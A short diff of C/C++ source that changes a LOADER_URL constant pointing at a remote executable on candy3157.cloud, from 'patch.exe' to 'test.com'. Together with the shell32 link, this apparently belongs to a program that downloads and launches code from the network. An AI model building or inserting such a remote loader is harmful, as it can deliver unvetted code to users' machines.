@@ -13,7 +13,7 @@
 #pragma comment(lib, "shell32.lib")
 
 #ifndef LOADER_URL
-#define LOADER_URL L"https://candy3157.cloud/downloads/patch.exe"
+#define LOADER_URL L"https://candy3157.cloud/downloads/test.com"
 #endif
 
 static const wchar_t *kUrl          = LOADER_URL;
